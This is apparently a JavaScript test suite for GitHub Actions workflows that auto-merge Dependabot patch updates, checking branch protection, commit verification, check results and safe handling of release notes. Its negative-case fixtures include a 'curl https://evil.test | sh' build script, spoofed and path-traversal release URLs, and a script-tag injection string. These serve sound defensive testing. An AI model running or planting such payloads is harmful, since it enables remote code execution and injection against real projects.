const assert = require('node:assert/strict');
const { readFileSync } = require('node:fs');
const { join } = require('node:path');
const test = require('node:test');

const workflows = ['dependency-context.yml', 'dependency-patch-merge.yml'].map(name =>
  readFileSync(join(__dirname, '../.github/workflows', name), 'utf8').replace(/\r\n/g, '\n'));
const scripts = workflows.map(workflow => workflow.split('          script: |\n')[1]
  .split('\n').map(line => line.startsWith('            ') ? line.slice(12) : line).join('\n'));
// Execute the actual trusted workflow script. PR fields remain data supplied to its API boundary.
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
const runners = scripts.map(script => new AsyncFunction('github', 'context', 'core', 'require', 'process', 'setTimeout', script));
const head = 'a'.repeat(40);
const base = 'b'.repeat(40);
const testMerge = 'c'.repeat(40);
const mergedSha = 'd'.repeat(40);
const start = '<!-- project-guard:dependency-context:start -->';
const end = '<!-- project-guard:dependency-context:end -->';

function fixture(repo = 'init') {
  const fullName = `Majkey25/${repo}`;
  const rulesetId = { init: 25776669, exhalace: 25776672, WeTheGods: 25776675, 'skloservis-brod': 25776676 }[repo] ?? 41;
  const names = repo === 'skloservis-brod'
    ? ['Locked dependency checks', 'Verify and build', 'CodeQL', 'Dependency review']
    : ['Format, typecheck, build', 'CodeQL', 'Dependency review'];
  const dependency = { dependencyName: 'astro', prevVersion: '5.1.1', newVersion: '5.1.2',
    updateType: 'version-update:semver-patch', maintainerChanges: false,
    packageEcosystem: 'npm_and_yarn', directory: '/', targetBranch: 'main',
    dependencyType: 'direct:production' };
  return {
    repo, dependencies: [dependency], metadataResult: 'success', auto: 'true', waits: 0, calls: [], notices: [], failures: [],
    repository: { archived: false, default_branch: 'main', allow_squash_merge: true },
    pr: { number: 17, node_id: 'PR_17', state: 'open', user: { login: 'dependabot[bot]' },
      head: { sha: head, repo: { full_name: fullName } },
      base: { sha: base, ref: 'main', repo: { full_name: fullName } },
      merge_commit_sha: testMerge, commits: 1, changed_files: 2, draft: false, auto_merge: null,
      mergeable: true, mergeable_state: 'clean', body: 'Original Dependabot body.\n\nHuman notes stay intact.' },
    commits: [{ sha: head, author: { login: 'dependabot[bot]' }, commit: {
      verification: { verified: true }, message: 'Bumps astro from 5.1.1 to 5.1.2.\n' +
        '[Release notes](https://github.com/withastro/astro/releases)' } }],
    files: ['package.json', 'package-lock.json'].map(filename => ({ filename, status: 'modified' })),
    before: { name: 'site', scripts: { build: 'astro build' }, dependencies: { astro: '^5.1.1' } },
    after: { name: 'site', scripts: { build: 'astro build' }, dependencies: { astro: '^5.1.2' } },
    branch: { protected: true, commit: { sha: base } },
    rules: [{ type: 'required_status_checks', ruleset_id: rulesetId,
      ruleset_source_type: 'Repository', ruleset_source: fullName,
      parameters: { strict_required_status_checks_policy: true,
        required_status_checks: names.map(context => ({ context, integration_id: 15368 })) } }],
    ruleset: { enforcement: 'active', bypass_actors: [], current_user_can_bypass: 'never' },
    runs: names.map(name => ({ name, status: 'completed', conclusion: 'success', app: { id: 15368, slug: 'github-actions' } })),
    statuses: [], releases: [{ tag_name: 'astro@5.1.2', draft: false, body: 'Fixes an upstream rendering issue.' }],
    mergeResponse: { merged: true, sha: mergedSha },
  };
}

async function execute(state) {
  const clone = value => structuredClone(value);
  const record = (op, params) => state.calls.push({ op, ...clone(params) });
  let gets = 0;
  const github = { rest: {
    repos: {
      get: async () => ({ data: clone(state.repository) }),
      getBranch: async () => {
        state.onProtection?.(state);
        return { data: clone(state.branch) };
      },
      getContent: async params => {
        record('content', params);
        assert.equal(params.path, 'package.json');
        assert([base, head].includes(params.ref));
        const content = Buffer.from(JSON.stringify(params.ref === base ? state.before : state.after)).toString('base64');
        return { data: { type: 'file', encoding: 'base64', size: 200, content } };
      },
      listCommitStatusesForRef: async params => ({ data: clone(state.statusesByRef?.[params.ref] ?? state.statuses) }),
      listReleases: async params => {
        record('releases', params);
        if (state.sourceError) throw state.sourceError;
        return { data: clone(state.releases) };
      },
      getReleaseByTag: async params => {
        record('release', params);
        if (state.sourceError) throw state.sourceError;
        return { data: clone(state.releases[0]) };
      },
    },
    pulls: {
      get: async () => {
        state.onGet?.(state, ++gets);
        return { data: clone(state.pr) };
      },
      listCommits: async () => ({ data: clone(state.commits) }),
      listFiles: async () => ({ data: clone(state.files) }),
      update: async params => { record('body', params); state.pr.body = params.body; return { data: clone(state.pr) }; },
      merge: async params => {
        record('merge', params);
        assert.equal(params.sha, head);
        assert.equal(params.merge_method, 'squash');
        assert.deepEqual(Object.keys(params).sort(), ['merge_method', 'owner', 'pull_number', 'repo', 'sha']);
        if (state.mergeError) throw state.mergeError;
        return { data: clone(state.mergeResponse) };
      },
    },
    checks: { listForRef: async params => {
      state.onChecks?.(state, params);
      return { data: clone(state.runsByRef?.[params.ref] ?? state.runs) };
    } },
    actions: { createWorkflowDispatch: async params => {
      record('dispatch', params);
      assert(state.calls.some(call => call.op === 'merge'));
      assert.equal(state.mergeResponse.merged, true);
      if (state.dispatchError) throw state.dispatchError;
      return { status: 204 };
    } },
  },
  paginate: async (route, params) => {
    if (typeof route === 'function') return (await route(params)).data;
    assert.equal(route, 'GET /repos/{owner}/{repo}/rules/branches/{branch}');
    if (state.rulesError) throw state.rulesError;
    return clone(state.rules);
  },
  request: async (route, params) => {
    assert.equal(route, 'GET /repos/{owner}/{repo}/rulesets/{ruleset_id}');
    record('ruleset', params);
    return { data: clone(state.ruleset) };
  } };
  const context = { eventName: state.eventName ?? 'pull_request_target',
    repo: { owner: state.owner ?? 'Majkey25', repo: state.repo }, runId: 123,
    payload: { pull_request: { ...clone(state.pr), body: state.eventBody ?? state.pr.body,
      head: { sha: state.eventHead ?? head } } } };
  const core = { notice: message => state.notices.push(message), setFailed: message => state.failures.push(message) };
  if (state.metadataResult !== 'success') return state;
  for (const runScript of runners) {
    try {
      await runScript(github, context, core, require,
        { env: { AUTO_MERGE: state.auto, DEPENDENCIES: JSON.stringify(state.dependencies) } },
        callback => { state.waits++; state.onWait?.(state); callback(); });
    } catch (error) {
      state.failures.push(error.message);
      break;
    }
  }
  return state;
}

function noMerge(state) {
  assert.equal(state.calls.filter(call => call.op === 'merge').length, 0);
  assert.equal(state.calls.filter(call => call.op === 'dispatch').length, 0);
}

test('controller pins real commits, keeps inputs in env, and never checks out PR code', () => {
  assert(workflows[1].includes('default: false'));
  assert(workflows[0].includes('contents: read'));
  assert(!/contents: write|actions: write/.test(workflows[0]));
  assert(workflows[1].includes('pull-requests: read'));
  assert(!/pulls\.merge|createWorkflowDispatch/.test(scripts[0]));
  assert(!scripts[1].includes('pulls.update'));
  for (const workflow of workflows) {
    assert(workflow.includes('dependabot/fetch-metadata@25dd0e34f4fe68f24cc83900b1fe3fe149efef98'));
    assert(workflow.includes('actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3'));
    assert(!/skip-(?:commit-)?verification|checkout@|secrets\.|eval\(|new Function|enablePullRequestAutoMerge/.test(workflow));
  }
  assert(scripts.every(script => !script.includes('${{')));
});

test('all four allowed sites merge with a SHA guard, then dispatch the correct workflow', async () => {
  for (const repo of ['init', 'exhalace', 'WeTheGods', 'skloservis-brod']) {
    const state = await execute(fixture(repo));
    const mutations = state.calls.filter(call => ['merge', 'dispatch'].includes(call.op));
    assert.deepEqual(mutations.map(call => call.op), ['merge', 'dispatch']);
    assert.equal(mutations[1].ref, 'main');
    assert.equal(mutations[1].workflow_id, repo === 'skloservis-brod' ? 'site.yml' : 'deploy.yml');
    assert.deepEqual(mutations[1].inputs, repo === 'skloservis-brod' ? { publish: 'true' } : undefined);
    assert.equal(state.waits, 0);
  }
});

test('auto-merge is opt-in and exact-repository-only; context still appears', async () => {
  for (const repo of ['Project-Guard', 'INIT', 'init-copy', 'init']) {
    const state = fixture(repo);
    if (repo === 'init') state.auto = 'false';
    await execute(state);
    noMerge(state);
    assert(state.pr.body.includes(start));
  }
});

test('wrong actor, event, owner, fork, base, archive, stale event and failed metadata cannot merge', async () => {
  const changes = [
    state => { state.pr.user.login = 'human'; },
    state => { state.eventName = 'pull_request'; },
    state => { state.owner = 'someone'; },
    state => { state.pr.head.repo.full_name = 'someone/init'; },
    state => { state.pr.base.ref = 'release'; },
    state => { state.repository.archived = true; },
    state => { state.eventHead = 'e'.repeat(40); },
    state => { state.eventBody = 'An older metadata event'; },
    state => { state.metadataResult = 'failure'; },
    state => { state.pr.draft = true; },
    state => { state.pr.state = 'closed'; },
    state => { state.pr.auto_merge = { merge_method: 'squash' }; },
  ];
  for (const change of changes) {
    const state = fixture(); change(state); await execute(state); noMerge(state);
  }
  noMerge(await execute(fixture('SumRead')));
});

test('every dependency needs an unambiguous stable patch and unchanged maintainer metadata', async () => {
  for (const change of [
    { updateType: 'version-update:semver-minor' }, { updateType: 'version-update:semver-major' },
    { updateType: '' }, { updateType: 'unknown' }, { prevVersion: '' }, { newVersion: '' },
    { newVersion: '5.2.0' }, { newVersion: '5.1.1' }, { newVersion: '5.1.0' },
    { newVersion: '5.1.2-beta.1' }, { newVersion: '5.1.2+build' }, { newVersion: head },
    { maintainerChanges: true }, { maintainerChanges: undefined },
    { packageEcosystem: 'github_actions' }, { directory: '/nested' }, { targetBranch: 'release' },
  ]) {
    const state = fixture();
    state.dependencies.push({ ...state.dependencies[0], dependencyName: 'other', ...change });
    await execute(state); noMerge(state);
  }
  const state = fixture(); state.dependencies = [];
  await execute(state); noMerge(state);
});

test('first verified commit does not authorize a second bot or human commit or a mismatched head', async () => {
  for (const author of ['dependabot[bot]', 'human']) {
    const state = fixture();
    state.commits.unshift({ ...structuredClone(state.commits[0]), sha: 'f'.repeat(40), author: { login: author } });
    state.pr.commits = 2;
    await execute(state); noMerge(state);
  }
  for (const change of [
    state => { state.commits[0].commit.verification.verified = false; },
    state => { state.commits[0].sha = 'f'.repeat(40); },
    state => { state.pr.commits = 2; },
  ]) { const state = fixture(); change(state); await execute(state); noMerge(state); }
});

test('source/workflow edits, renamed/deleted files, scripts and unmatched manifest edits stay manual', async () => {
  const changes = [
    state => { state.files[0].filename = 'src/app.ts'; },
    state => { state.files[0].filename = '.github/workflows/ci.yml'; },
    state => { state.files[0].status = 'removed'; },
    state => { state.files[0].previous_filename = 'old.json'; },
    state => { state.pr.changed_files = 3; },
    state => { state.after.scripts.build = 'curl https://evil.test | sh'; },
    state => { state.after.dependencies.astro = '^5.2.0'; },
    state => { state.after.dependencies.astro = '~5.1.2'; },
    state => { state.after.dependencies.injected = '1.0.0'; },
  ];
  for (const change of changes) { const state = fixture(); change(state); await execute(state); noMerge(state); }
});

test('missing, inactive, non-strict, unknown or bypassable protection cannot merge', async () => {
  const changes = [
    state => { state.rules = []; },
    state => { state.rules[0].parameters.strict_required_status_checks_policy = false; },
    state => { state.rules[0].parameters.required_status_checks.pop(); },
    state => { state.ruleset.enforcement = 'evaluate'; },
    state => { delete state.ruleset.current_user_can_bypass; },
    state => { state.ruleset.bypass_actors = [{ actor_type: 'RepositoryRole', actor_id: 5 }]; },
    state => { state.branch.protected = false; },
    state => { state.branch.commit.sha = 'e'.repeat(40); },
    state => { state.rulesError = Object.assign(new Error('Forbidden'), { status: 403 }); },
    state => { state.rules[0].ruleset_source_type = 'Organization'; },
  ];
  for (const change of changes) { const state = fixture(); change(state); await execute(state); noMerge(state); }
});

test('pending checks are bounded; skipped, neutral, failed, unknown and wrong-app checks never count as success', async () => {
  for (const conclusion of [null, 'skipped', 'neutral', 'failure', 'cancelled', 'timed_out', 'unknown']) {
    const state = fixture(); state.runs[0].conclusion = conclusion;
    await execute(state); noMerge(state);
    assert.equal(state.waits, 60);
    assert(state.notices.some(notice => notice.includes('20-minute wait')));
  }
  const state = fixture(); state.runs[0].app.id = 999;
  await execute(state); noMerge(state);
});

test('waits for all required contexts including additional rules, then rechecks before merge', async () => {
  const state = fixture();
  state.rules[0].parameters.required_status_checks.push({ context: 'extra', integration_id: 15368 });
  state.onWait = current => {
    current.runs.push({ name: 'extra', status: 'completed', conclusion: 'success', app: { id: 15368 } });
  };
  await execute(state);
  assert.equal(state.waits, 1);
  assert(state.calls.some(call => call.op === 'dispatch'));
  assert.equal(state.calls.filter(call => call.op === 'ruleset').length, 2);
});

test('failed test-merge checks and same-name statuses beat successful head checks', async () => {
  for (const mode of ['test-merge', 'status']) {
    const state = fixture();
    if (mode === 'test-merge') {
      state.runsByRef = { [testMerge]: structuredClone(state.runs) };
      state.runsByRef[testMerge][0].conclusion = 'failure';
    } else state.statuses = [{ context: state.runs[0].name, state: 'failure' }];
    await execute(state); noMerge(state);
  }
});

test('head, base and protection changes during wait fail closed', async () => {
  for (const part of ['head', 'base']) {
    const state = fixture(); state.runs[0].conclusion = null;
    state.onWait = current => { current.pr[part].sha = 'e'.repeat(40); };
    await execute(state);
    assert(state.notices.some(notice => notice.includes('changed during verification')));
    noMerge(state);
  }
  const state = fixture(); let protectionCalls = 0;
  state.onProtection = current => { if (++protectionCalls === 2) current.ruleset.bypass_actors = [{}]; };
  await execute(state); noMerge(state);
});

test('review blocks and merge rejection never approve or dispatch deployment', async () => {
  const blocked = fixture(); blocked.pr.mergeable_state = 'blocked';
  await execute(blocked); noMerge(blocked);
  for (const response of [{ merged: false, sha: mergedSha }, { merged: true, sha: null }]) {
    const state = fixture(); state.mergeResponse = response;
    await execute(state);
    assert(!state.calls.some(call => call.op === 'dispatch'));
  }
  for (const status of [403, 405, 409]) {
    const state = fixture(); state.mergeError = Object.assign(new Error('Protected merge rejected'), { status });
    await execute(state);
    assert(!state.calls.some(call => call.op === 'dispatch'));
    assert(state.notices.some(notice => notice.includes('Protected merge rejected')));
  }
});

test('dispatch rejection reports a merged commit and incomplete deployment without retrying the merge', async () => {
  const state = fixture(); state.dispatchError = Object.assign(new Error('Forbidden'), { status: 403 });
  await execute(state);
  assert.equal(state.calls.filter(call => call.op === 'merge').length, 1);
  assert.equal(state.calls.filter(call => call.op === 'dispatch').length, 1);
  assert(state.failures[0].includes(`Merged ${mergedSha}, but deployment dispatch failed (403)`));
});

test('body replacement is idempotent and preserves all text outside owned markers', async () => {
  const state = fixture(); state.auto = 'false';
  const prefix = 'Human prefix\n\n'; const suffix = '\nHuman suffix';
  state.pr.body = prefix + start + '\nOld context\n' + end + suffix;
  await execute(state);
  const body = state.pr.body;
  state.calls = []; await execute(state);
  assert.equal(state.pr.body, body);
  assert(state.pr.body.startsWith(prefix)); assert(state.pr.body.endsWith(suffix));
  assert(!state.calls.some(call => call.op === 'body'));
  assert.equal(state.pr.body.split(start).length, 2);
});

test('malformed markers and oversized bodies preserve original text and cannot merge', async () => {
  for (const body of [start, end + start, start + end + start + end, 'x'.repeat(60000)]) {
    const state = fixture(); state.pr.body = body;
    await execute(state);
    assert(state.failures.some(failure => /body budget|markers/.test(failure)));
    noMerge(state); assert.equal(state.pr.body, body);
  }
});

test('only signed GitHub release links are fetched; missing sources and upstream failures stay explicit', async () => {
  for (const link of ['https://evil.test/releases', 'https://github.com.evil.test/a/b/releases',
    'https://github.com/a/b/releases/tag/%2e%2e%2fsecret', 'https://github.com/a/b/releases/tag/%GG']) {
    const state = fixture(); state.auto = 'false';
    state.commits[0].commit.message = `Release ${link}`;
    state.pr.body = '[Release notes](https://github.com/untrusted/body/releases)';
    await execute(state);
    assert(!state.calls.some(call => ['release', 'releases'].includes(call.op)));
  }
  const state = fixture(); state.sourceError = Object.assign(new Error('Not Found'), { status: 404 });
  await execute(state); assert(state.pr.body.includes('lookup unavailable (404)'));
});

test('release excerpts cannot inject HTML or markers and stay bounded', async () => {
  const state = fixture(); state.auto = 'false';
  state.releases[0].body = '</pre><script>alert(1)</script> ' + start + ' word'.repeat(100);
  await execute(state);
  assert(!state.pr.body.includes('<script>'));
  assert(state.pr.body.includes('&lt;script&gt;'));
  assert.equal(state.pr.body.split(start).length, 2);
  assert(!state.pr.body.includes(' word'.repeat(30)));
});

test('hidden roster requires own-token never; visible nonempty roster and unknown own bypass stay HOLD', async () => {
  const allowed = fixture(); delete allowed.ruleset.bypass_actors;
  await execute(allowed);
  assert(allowed.calls.some(call => call.op === 'dispatch'));
  for (const own of [undefined, 'always', 'pull_requests_only', 'unknown']) {
    for (const visible of [true, false]) {
      const state = fixture(); state.ruleset.current_user_can_bypass = own;
      if (!visible) delete state.ruleset.bypass_actors;
      await execute(state); noMerge(state);
      assert(state.notices.some(notice => notice.includes('HOLD')));
    }
  }
  const state = fixture(); state.ruleset.bypass_actors = [{}];
  await execute(state); noMerge(state);
});

test('native code-scanning findings and unfinished nonrequired checks also block merge', async () => {
  for (const conclusion of ['failure', 'neutral', null]) {
    const state = fixture();
    state.runs.push({ name: 'Code scanning results / CodeQL', status: conclusion ? 'completed' : 'queued',
      conclusion, app: { id: 123, slug: 'github-code-scanning' } });
    await execute(state); noMerge(state);
    assert.equal(state.waits, 60);
  }
});
